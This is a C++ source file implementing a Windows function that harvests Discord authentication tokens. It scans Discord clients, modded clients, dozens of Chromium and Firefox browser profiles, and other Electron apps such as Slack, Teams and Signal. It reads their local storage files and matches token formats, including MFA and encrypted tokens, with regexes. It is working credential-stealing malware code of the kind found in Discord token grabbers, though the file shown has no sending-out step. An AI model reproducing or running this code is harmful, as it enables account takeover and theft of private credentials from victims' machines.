#include "discord_tokens.h"
#include <windows.h>
#include <shlobj.h>
#include <fstream>
#include <filesystem>
#include <regex>
#include <set>
#include <string>
#include <vector>
#include <algorithm>

namespace fs = std::filesystem;

std::vector<std::string> extract_discord_tokens() {
    std::set<std::string> foundTokens; // Use set to avoid duplicates

    // Get user home directory
    char userProfile[MAX_PATH];
    if (FAILED(SHGetFolderPathA(nullptr, CSIDL_PROFILE, nullptr, 0, userProfile))) {
        return {};
    }

    std::string userHome = userProfile;
    std::string appData = userHome + "\\AppData\\Roaming";
    std::string localAppData = userHome + "\\AppData\\Local";

    // All paths where Discord tokens might be stored
    std::vector<std::string> tokenPaths = {
        // Discord clients
        appData + "\\Discord\\Local Storage\\leveldb",
        appData + "\\discordcanary\\Local Storage\\leveldb",
        appData + "\\discordptb\\Local Storage\\leveldb",
        appData + "\\discorddevelopment\\Local Storage\\leveldb",
        
        // Discord mods and alternative clients
        appData + "\\Lightcord\\Local Storage\\leveldb",
        appData + "\\BetterDiscord\\data",
        appData + "\\Vencord\\Local Storage\\leveldb",
        appData + "\\ArmCord\\Local Storage\\leveldb",
        appData + "\\Replugged\\Local Storage\\leveldb",
        appData + "\\WebCord\\Local Storage\\leveldb",
        appData + "\\GooseMod\\Local Storage\\leveldb",
        appData + "\\Powercord\\Local Storage\\leveldb",
        appData + "\\discord-desktop-core",
        
        // Chromium-based browsers (tokens from Discord web)
        localAppData + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb",
        localAppData + "\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb",
        localAppData + "\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb",
        localAppData + "\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb",
        localAppData + "\\Google\\Chrome SxS\\User Data\\Default\\Local Storage\\leveldb",
        localAppData + "\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb",
        localAppData + "\\Microsoft\\Edge\\User Data\\Profile 1\\Local Storage\\leveldb",
        localAppData + "\\Microsoft\\Edge\\User Data\\Profile 2\\Local Storage\\leveldb",
        localAppData + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb",
        localAppData + "\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\Local Storage\\leveldb",
        appData + "\\Opera Software\\Opera Stable\\Local Storage\\leveldb",
        appData + "\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb",
        appData + "\\Opera Software\\Opera Neon\\User Data\\Default\\Local Storage\\leveldb",
        localAppData + "\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb",
        localAppData + "\\Vivaldi\\User Data\\Profile 1\\Local Storage\\leveldb",
        localAppData + "\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb",
        localAppData + "\\CentBrowser\\User Data\\Default\\Local Storage\\leveldb",
        localAppData + "\\7Star\\7Star\\User Data\\Default\\Local Storage\\leveldb",
        localAppData + "\\Iridium\\User Data\\Default\\Local Storage\\leveldb",
        localAppData + "\\Epic Privacy Browser\\User Data\\Default\\Local Storage\\leveldb",
        localAppData + "\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb",
        localAppData + "\\Fenrir Inc\\Sleipnir5\\setting\\modules\\ChromiumViewer\\Default\\Local Storage\\leveldb",
        localAppData + "\\Comodo\\Dragon\\User Data\\Default\\Local Storage\\leveldb",
        localAppData + "\\Torch\\User Data\\Default\\Local Storage\\leveldb",
        localAppData + "\\CocCoc\\Browser\\User Data\\Default\\Local Storage\\leveldb",
        localAppData + "\\Amigo\\User Data\\Default\\Local Storage\\leveldb",
        localAppData + "\\Orbitum\\User Data\\Default\\Local Storage\\leveldb",
        localAppData + "\\Mail.Ru\\Atom\\User Data\\Default\\Local Storage\\leveldb",
        localAppData + "\\Kometa\\User Data\\Default\\Local Storage\\leveldb",
        localAppData + "\\Maxthon5\\Users\\guest\\Default\\Local Storage\\leveldb",
        localAppData + "\\Sputnik\\Sputnik\\User Data\\Default\\Local Storage\\leveldb",
        localAppData + "\\Chromium\\User Data\\Default\\Local Storage\\leveldb",
        localAppData + "\\360Browser\\Browser\\User Data\\Default\\Local Storage\\leveldb",
        localAppData + "\\360Chrome\\Chrome\\User Data\\Default\\Local Storage\\leveldb",
        localAppData + "\\QQBrowser\\User Data\\Default\\Local Storage\\leveldb",
        
        // Firefox-based (tokens stored differently but check anyway)
        appData + "\\Mozilla\\Firefox\\Profiles",
        appData + "\\Waterfox\\Profiles",
        appData + "\\Pale Moon\\Profiles",
        appData + "\\K-Meleon",
        
        // Other Electron apps that might have Discord integration
        appData + "\\Slack\\Local Storage\\leveldb",
        appData + "\\Teams\\Local Storage\\leveldb",
        localAppData + "\\Programs\\signal-desktop\\Local Storage\\leveldb",
        appData + "\\Franz\\Local Storage\\leveldb",
        appData + "\\Ferdi\\Local Storage\\leveldb",
        appData + "\\Rambox\\Local Storage\\leveldb",
        appData + "\\Hype\\Local Storage\\leveldb",
        
        // Gaming platforms that might cache Discord
        appData + "\\Steam\\htmlcache\\Local Storage\\leveldb",
        localAppData + "\\NVIDIA Corporation\\NVIDIA GeForce Experience\\CefCache\\Local Storage\\leveldb",
        
        // Development environments
        localAppData + "\\electron\\Local Storage\\leveldb",
        appData + "\\Postman\\Local Storage\\leveldb",
    };

    // Token patterns - Discord tokens are typically base64-like strings
    std::vector<std::regex> tokenPatterns = {
        std::regex("mfa\\.[A-Za-z0-9_-]{84,}"), // MFA token (2FA enabled)
        std::regex("[A-Za-z0-9_-]{24,26}\\.[A-Za-z0-9_-]{6}\\.[A-Za-z0-9_-]{25,110}"), // Standard token
        std::regex("\"token\"\\s*[:=]\\s*\"([A-Za-z0-9_.-]{50,})\""), // JSON format
        std::regex("token['\"]?\\s*[:=]\\s*['\"]?([A-Za-z0-9_.-]{50,})"), // Alternative JSON format
        std::regex("(?:discord|token)[\"']?\\s*[:=]\\s*[\"']?([A-Za-z0-9_.-]{24,26}\\.[A-Za-z0-9_.-]{6}\\.[A-Za-z0-9_.-]{25,110})"),
        std::regex("dQw4w9WgXcQ:[A-Za-z0-9_-]{100,}"), // Encrypted token format
        std::regex("oken\\\":\\\"([A-Za-z0-9_.-]{24,})\\.[A-Za-z0-9_.-]{6}\\.[A-Za-z0-9_.-]{25,}"), // Partial match
        std::regex("\\\"([A-Za-z0-9_-]{24})\\.[A-Za-z0-9_-]{6}\\.[A-Za-z0-9_-]{27,}\\\""), // Quoted token
    };

    // Function to validate Discord token format
    auto isValidDiscordToken = [](const std::string& token) -> bool {
        std::string cleanToken = token;
        cleanToken.erase(cleanToken.begin(), std::find_if(cleanToken.begin(), cleanToken.end(),
                        [](unsigned char ch) { return !std::isspace(ch); }));
        cleanToken.erase(std::find_if(cleanToken.rbegin(), cleanToken.rend(),
                        [](unsigned char ch) { return !std::isspace(ch); }).base(), cleanToken.end());

        if (cleanToken.length() < 50) return false;
        
        // Skip obvious false positives
        if (cleanToken.find("http") != std::string::npos) return false;
        if (cleanToken.find("www.") != std::string::npos) return false;
        if (cleanToken.find("example") != std::string::npos) return false;

        // Check for MFA token format: mfa.[84+ chars]
        if (cleanToken.find("mfa.") == 0 && cleanToken.length() >= 88) {
            return std::regex_match(cleanToken, std::regex("[A-Za-z0-9_.-]+"));
        }

        // Check for encrypted token format
        if (cleanToken.find("dQw4w9WgXcQ:") == 0) {
            return cleanToken.length() > 120;
        }

        // Check for standard format: [24-26].[6].[25-110]
        size_t firstDot = cleanToken.find('.');
        if (firstDot == std::string::npos) return false;

        size_t secondDot = cleanToken.find('.', firstDot + 1);
        if (secondDot == std::string::npos) return false;

        std::string part1 = cleanToken.substr(0, firstDot);
        std::string part2 = cleanToken.substr(firstDot + 1, secondDot - firstDot - 1);
        std::string part3 = cleanToken.substr(secondDot + 1);

        // Validate each part
        if (part1.length() >= 18 && part1.length() <= 28 &&
            part2.length() >= 4 && part2.length() <= 8 &&
            part3.length() >= 20 && part3.length() <= 140 &&
            std::regex_match(part1, std::regex("[A-Za-z0-9_-]+")) &&
            std::regex_match(part2, std::regex("[A-Za-z0-9_-]+")) &&
            std::regex_match(part3, std::regex("[A-Za-z0-9_-]+"))) {
            return true;
        }

        return false;
    };

    // Function to scan a directory for tokens
    auto scanDirectory = [&](const std::string& dirPath) {
        try {
            if (!fs::exists(dirPath)) return;
            
            // If it's a directory, scan files inside
            if (fs::is_directory(dirPath)) {
                std::vector<fs::path> filesToScan;
                
                // Recursively find all potential token files
                try {
                    for (const auto& entry : fs::recursive_directory_iterator(dirPath, 
                            fs::directory_options::skip_permission_denied)) {
                        if (!entry.is_regular_file()) continue;
                        
                        std::string filename = entry.path().filename().string();
                        std::string ext = entry.path().extension().string();
                        std::transform(filename.begin(), filename.end(), filename.begin(), ::toupper);
                        std::transform(ext.begin(), ext.end(), ext.begin(), ::toupper);
                        
                        // Skip lock files and very large files
                        if (filename == "LOCK" || filename == "LOG.OLD") continue;
                        if (entry.file_size() > 50LL * 1024 * 1024) continue; // Skip > 50MB
                        
                        // Prioritize certain file types
                        if (ext == ".LDB" || ext == ".LOG" || ext == ".JSON" || 
                            ext == ".SQLITE" || ext == ".DB" || ext == "" ||
                            filename.find("LOCAL STORAGE") != std::string::npos ||
                            filename.find("LEVELDB") != std::string::npos) {
                            filesToScan.push_back(entry.path());
                        }
                    }
                } catch (...) {
                    // If recursive fails, try non-recursive
                    for (const auto& entry : fs::directory_iterator(dirPath, 
                            fs::directory_options::skip_permission_denied)) {
                        if (entry.is_regular_file() && entry.file_size() < 50LL * 1024 * 1024) {
                            filesToScan.push_back(entry.path());
                        }
                    }
                }

                // Sort files by size (smaller files first for speed)
                std::sort(filesToScan.begin(), filesToScan.end(),
                         [](const fs::path& a, const fs::path& b) {
                             try {
                                 return fs::file_size(a) < fs::file_size(b);
                             } catch (...) { return false; }
                         });

                for (const auto& filePath : filesToScan) {
                    try {
                        std::ifstream file(filePath, std::ios::binary | std::ios::ate);
                        if (!file) continue;

                        std::streamsize fileSize = file.tellg();
                        if (fileSize <= 0 || fileSize > 50LL * 1024 * 1024) continue;
                        
                        file.seekg(0, std::ios::beg);
                        std::vector<char> buffer(static_cast<size_t>(fileSize));
                        if (!file.read(buffer.data(), fileSize)) continue;
                        file.close();

                        std::string content(buffer.begin(), buffer.end());

                        // Search using regex patterns
                        for (const auto& pattern : tokenPatterns) {
                            try {
                                std::sregex_iterator iter(content.begin(), content.end(), pattern);
                                std::sregex_iterator end;

                                for (; iter != end; ++iter) {
                                    std::smatch match = *iter;
                                    std::string token = match[1].matched ? match[1].str() : match[0].str();

                                    if (isValidDiscordToken(token)) {
                                        std::string cleanToken = token;
                                        cleanToken.erase(cleanToken.begin(),
                                                       std::find_if(cleanToken.begin(), cleanToken.end(),
                                                                   [](unsigned char ch) { return !std::isspace(ch); }));
                                        cleanToken.erase(std::find_if(cleanToken.rbegin(), cleanToken.rend(),
                                                                     [](unsigned char ch) { return !std::isspace(ch); }).base(),
                                                       cleanToken.end());
                                        // Remove quotes if present
                                        if (!cleanToken.empty() && (cleanToken.front() == '"' || cleanToken.front() == '\'')) {
                                            cleanToken = cleanToken.substr(1);
                                        }
                                        if (!cleanToken.empty() && (cleanToken.back() == '"' || cleanToken.back() == '\'')) {
                                            cleanToken.pop_back();
                                        }
                                        if (isValidDiscordToken(cleanToken)) {
                                            foundTokens.insert(cleanToken);
                                        }
                                    }
                                }
                            } catch (...) { continue; }
                        }

                        // Direct pattern matching (more flexible)
                        try {
                            std::regex directPattern("[A-Za-z0-9_-]{18,28}\\.[A-Za-z0-9_-]{4,8}\\.[A-Za-z0-9_-]{20,140}|mfa\\.[A-Za-z0-9_-]{84,}|dQw4w9WgXcQ:[A-Za-z0-9_-]{100,}");
                            std::sregex_iterator directIter(content.begin(), content.end(), directPattern);
                            std::sregex_iterator directEnd;

                            for (; directIter != directEnd; ++directIter) {
                                std::string potentialToken = (*directIter)[0].str();
                                if (isValidDiscordToken(potentialToken)) {
                                    foundTokens.insert(potentialToken);
                                }
                            }
                        } catch (...) {}

                    } catch (...) { continue; }
                }
            }
        } catch (...) {}
    };

    // Scan all token paths
    for (const auto& path : tokenPaths) {
        scanDirectory(path);
    }

    // Also scan Firefox profiles more thoroughly
    std::string firefoxProfiles = appData + "\\Mozilla\\Firefox\\Profiles";
    try {
        if (fs::exists(firefoxProfiles) && fs::is_directory(firefoxProfiles)) {
            for (const auto& profile : fs::directory_iterator(firefoxProfiles)) {
                if (profile.is_directory()) {
                    scanDirectory(profile.path().string() + "\\storage\\default");
                    scanDirectory(profile.path().string() + "\\webappsstore.sqlite");
                    
                    // Check for discord.com storage
                    std::string discordStorage = profile.path().string() + "\\storage\\default\\https+++discord.com";
                    scanDirectory(discordStorage);
                    discordStorage = profile.path().string() + "\\storage\\default\\https+++discordapp.com";
                    scanDirectory(discordStorage);
                }
            }
        }
    } catch (...) {}

    // Scan Chrome profiles dynamically
    std::string chromeBase = localAppData + "\\Google\\Chrome\\User Data";
    try {
        if (fs::exists(chromeBase) && fs::is_directory(chromeBase)) {
            for (const auto& entry : fs::directory_iterator(chromeBase)) {
                if (entry.is_directory()) {
                    std::string dirName = entry.path().filename().string();
                    if (dirName == "Default" || dirName.find("Profile") == 0) {
                        scanDirectory(entry.path().string() + "\\Local Storage\\leveldb");
                        scanDirectory(entry.path().string() + "\\IndexedDB");
                    }
                }
            }
        }
    } catch (...) {}

    // Scan Edge profiles dynamically
    std::string edgeBase = localAppData + "\\Microsoft\\Edge\\User Data";
    try {
        if (fs::exists(edgeBase) && fs::is_directory(edgeBase)) {
            for (const auto& entry : fs::directory_iterator(edgeBase)) {
                if (entry.is_directory()) {
                    std::string dirName = entry.path().filename().string();
                    if (dirName == "Default" || dirName.find("Profile") == 0) {
                        scanDirectory(entry.path().string() + "\\Local Storage\\leveldb");
                        scanDirectory(entry.path().string() + "\\IndexedDB");
                    }
                }
            }
        }
    } catch (...) {}

    // Scan Brave profiles dynamically  
    std::string braveBase = localAppData + "\\BraveSoftware\\Brave-Browser\\User Data";
    try {
        if (fs::exists(braveBase) && fs::is_directory(braveBase)) {
            for (const auto& entry : fs::directory_iterator(braveBase)) {
                if (entry.is_directory()) {
                    std::string dirName = entry.path().filename().string();
                    if (dirName == "Default" || dirName.find("Profile") == 0) {
                        scanDirectory(entry.path().string() + "\\Local Storage\\leveldb");
                        scanDirectory(entry.path().string() + "\\IndexedDB");
                    }
                }
            }
        }
    } catch (...) {}

    return std::vector<std::string>(foundTokens.begin(), foundTokens.end());
}
